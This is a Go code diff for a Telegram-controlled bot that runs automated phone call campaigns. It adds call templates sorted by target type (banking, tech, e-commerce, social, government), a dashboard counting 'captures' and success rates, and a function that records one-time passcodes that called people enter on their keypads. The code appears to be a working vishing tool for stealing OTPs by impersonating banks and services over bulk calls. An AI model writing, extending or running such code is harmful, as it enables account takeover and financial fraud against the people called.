@@ -27,6 +27,11 @@ const (
 	ActionCampaignDelete    = "campaign_delete"
 	ActionBatchStart        = "batch_start"
 	ActionTemplates         = "templates"
+	ActionTemplatesBanking  = "tpl_banking"
+	ActionTemplatesTech     = "tpl_tech"
+	ActionTemplatesEcomm    = "tpl_ecomm"
+	ActionTemplatesSocial   = "tpl_social"
+	ActionTemplatesOther    = "tpl_other"
 	ActionTemplateDetails   = "template_detail"
 	ActionSingleCall        = "call_single"
 	ActionCallServiceSelect = "call_service"
@@ -44,7 +49,19 @@ const (
 	ActionConfirmNo         = "confirm_no"
 	ActionHelp              = "help"
 	ActionRefresh           = "refresh"
+	ActionDashboard         = "dashboard"
+	ActionQuickCall        = "quick_call"
 )
+
+// Template categories for organization
+var CategoryIcons = map[string]string{
+	"banking":    "🏦",
+	"tech":       "💻",
+	"ecommerce":  "🛒",
+	"social":     "📱",
+	"government": "🏛️",
+	"other":     "📌",
+}
 
 // UserState tracks wizard flow state per user
 type UserState struct {
@@ -220,6 +237,18 @@ func (b *Bot) handleCallbackQuery(callback *tgbotapi.CallbackQuery) {
 	case ActionTemplates:
 		botStateGlobal.ClearUserState(userID)
 		b.showTemplates(callback.Message.Chat.ID, callback.Message.MessageID)
+		case ActionTemplatesBanking:
+			b.showTemplatesByCategory(callback.Message.Chat.ID, callback.Message.MessageID, "banking")
+		case ActionTemplatesTech:
+			b.showTemplatesByCategory(callback.Message.Chat.ID, callback.Message.MessageID, "tech")
+		case ActionTemplatesEcomm:
+			b.showTemplatesByCategory(callback.Message.Chat.ID, callback.Message.MessageID, "ecommerce")
+		case ActionTemplatesSocial:
+			b.showTemplatesByCategory(callback.Message.Chat.ID, callback.Message.MessageID, "social")
+		case ActionTemplatesOther:
+			b.showTemplatesByCategory(callback.Message.Chat.ID, callback.Message.MessageID, "other")
+		case ActionDashboard:
+			b.showDashboard(callback.Message.Chat.ID, callback.Message.MessageID)
 	case ActionTemplateDetails:
 		b.showTemplateDetail(callback.Message.Chat.ID, callback.Message.MessageID, cb.Data["name"])
 	case ActionSingleCall:
@@ -1188,4 +1217,207 @@ func min(a, b int) int {
 		return a
 	}
 	return b
+}
+
+// showTemplatesByCategory shows templates filtered by category
+func (b *Bot) showTemplatesByCategory(chatID int64, messageID int, category string) {
+	templates, err := b.db.GetAllTemplates()
+	if err != nil {
+		b.editReplyMarkup(chatID, messageID, "❌ Failed to fetch templates", nil)
+		return
+	}
+
+	// Filter templates by category
+	var filtered []models.Template
+	for _, t := range templates {
+		if t.Category == category {
+			filtered = append(filtered, t)
+		}
+	}
+
+	icon := CategoryIcons[category]
+	if icon == "" {
+		icon = "📌"
+	}
+
+	categoryName := strings.Title(category)
+
+	text := fmt.Sprintf("%s *%s Templates*\n\n", icon, categoryName)
+
+	if len(filtered) == 0 {
+		text += "No templates in this category.\n\n💡 Use /addtemplate to create one."
+	} else {
+		for _, t := range filtered {
+			serviceIcon := "📱"
+			if t.Icon != "" {
+				serviceIcon = t.Icon
+			}
+			text += fmt.Sprintf("%s *%s*\n   Voice: `%s`\n\n", serviceIcon, t.Name, t.Voice)
+		}
+	}
+
+	var keyboard tgbotapi.InlineKeyboardMarkup
+	keyboard.InlineKeyboard = [][]tgbotapi.InlineKeyboardButton{
+		{
+			tgbotapi.NewInlineKeyboardButtonData("🏦 Banking", MarshalCallbackData(ActionTemplatesBanking, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("💻 Tech", MarshalCallbackData(ActionTemplatesTech, nil)),
+		},
+		{
+			tgbotapi.NewInlineKeyboardButtonData("🛒 E-Commerce", MarshalCallbackData(ActionTemplatesEcomm, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("📱 Social", MarshalCallbackData(ActionTemplatesSocial, nil)),
+		},
+		{
+			tgbotapi.NewInlineKeyboardButtonData("📌 Other", MarshalCallbackData(ActionTemplatesOther, nil)),
+			tgbotapi.NewInlineKeyboardButtonData("📝 All Templates", MarshalCallbackData(ActionTemplates, nil)),
+		},
+		{
+			tgbotapi.NewInlineKeyboardButtonData("🏠 Main Menu", MarshalCallbackData(ActionMainMenu, nil)),
+		},
+	}
+
+	b.editReplyMarkup(chatID, messageID, text, &keyboard)
+}
+
+// showDashboard shows a rich real-time dashboard
+func (b *Bot) showDashboard(chatID int64, messageID int) {
+	stats, _ := b.db.GetGlobalStats()
+	activeCalls := b.GetActiveCalls()
+
+	// Get active campaigns
+	campaigns, _ := b.db.GetAllCampaigns()
+	var activeCampaigns []models.Campaign
+	for _, c := range campaigns {
+		if c.Status == models.CampaignStatusActive {
+			activeCampaigns = append(activeCampaigns, c)
+		}
+	}
+
+	// Calculate success rate color
+	successEmoji := "🟢"
+	if stats.SuccessRate < 50 {
+		successEmoji = "🟡"
+	}
+	if stats.SuccessRate < 25 {
+		successEmoji = "🔴"
+	}
+
+	text := fmt.Sprintf(`🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥
+
+📊 *REAL-TIME DASHBOARD*
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+🎯 *System Status*
+├ Active Calls: %d
+├ Active Campaigns: %d
+└ System: ● Online
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📈 *Performance*
+├ Total Captures: %d
+├ Success Rate: %s %.1f%%
+├ Today: %d calls | %d captures
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📞 *Call Statistics*
+├ Total Calls: %d
+├ Answered: %d (%.1f%%)
+├ Voicemail: %d
+└ Failed: %d
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+💾 *Campaigns*
+├ Total: %d
+├ Active: %d
+├ Paused: %d
+└ Completed: %d
+
+🔥━━━━━━━━━━━━━━━━━━━━━━━━━━🔥`,
+		activeCalls, len(activeCampaigns),
+		stats.TotalCaptures, successEmoji, stats.SuccessRate, stats.TodayCalls, stats.TodayCaptures,
+		stats.TotalCalls, stats.AnsweredCalls, stats.SuccessRate, stats.Voicemails, stats.FailedCalls,
+		stats.TotalCampaigns, stats.ActiveCampaigns, stats.PausedCampaigns, stats.CompletedCampaigns)
+
+	var keyboard tgbotapi.InlineKeyboardMarkup
+	if len(activeCampaigns) > 0 {
+		// Show quick actions for active campaigns
+		var buttons []tgbotapi.InlineKeyboardButton
+		for i, c := range activeCampaigns {
+			if i < 3 { // Show max 3 campaigns inline
+				buttons = append(buttons, tgbotapi.NewInlineKeyboardButtonData(
+					fmt.Sprintf("📋 %s", truncate(c.Name, 15)),
+					MarshalCallbackData(ActionCampaignDetails, map[string]string{"id": strconv.FormatInt(c.ID, 10)}),
+				))
+			}
+		}
+		if len(buttons) > 0 {
+			keyboard.InlineKeyboard = append(keyboard.InlineKeyboard, buttons)
+		}
+	}
+
+	keyboard.InlineKeyboard = append(keyboard.InlineKeyboard,
+		[][]tgbotapi.InlineKeyboardButton{
+			{
+				tgbotapi.NewInlineKeyboardButtonData("🎯 Quick Call", MarshalCallbackData(ActionSingleCall, nil)),
+				tgbotapi.NewInlineKeyboardButtonData("🚀 Batch Campaign", MarshalCallbackData(ActionBatchStart, nil)),
+			},
+			{
+				tgbotapi.NewInlineKeyboardButtonData("📊 Full Stats", MarshalCallbackData(ActionStats, nil)),
+				tgbotapi.NewInlineKeyboardButtonData("📋 All Campaigns", MarshalCallbackData(ActionCampaigns, nil)),
+			},
+			{
+				tgbotapi.NewInlineKeyboardButtonData("🔄 Refresh", MarshalCallbackData(ActionDashboard, nil)),
+				tgbotapi.NewInlineKeyboardButtonData("🏠 Main Menu", MarshalCallbackData(ActionMainMenu, nil)),
+			},
+		}...)
+
+	b.editReplyMarkup(chatID, messageID, text, &keyboard)
+}
+
+// GetCallState returns detailed state for a call
+func (b *Bot) GetCallState(callID int64) (*ActiveCall, bool) {
+	b.mu.RLock()
+	defer b.mu.RUnlock()
+	for _, call := range b.activeCalls {
+		if call.CallID == callID {
+			return call, true
+		}
+	}
+	return nil, false
+}
+
+// UpdateCallOTP updates the OTP for a call
+func (b *Bot) UpdateCallOTP(callID int64, otp string) {
+	b.mu.Lock()
+	defer b.mu.Unlock()
+	for _, call := range b.activeCalls {
+		if call.CallID == callID {
+			call.OTP = otp
+			call.Status = "dtmf_collected"
+			return
+		}
+	}
+}
+
+// GetCampaignProgress returns progress stats for a campaign
+func (b *Bot) GetCampaignProgress(campaignID int64) (total, completed, captures, remaining int) {
+	b.mu.RLock()
+	defer b.mu.RUnlock()
+
+	if state, ok := b.campaignState[campaignID]; ok {
+		state.mu.Lock()
+		total = len(state.phones)
+		remaining = len(state.phones) - state.index
+		state.mu.Unlock()
+	}
+
+	if campaign, err := b.db.GetCampaign(campaignID); err == nil {
+		completed = campaign.Completed
+		captures = campaign.Captures
+	}
+
+	return total, completed, captures, remaining
 }
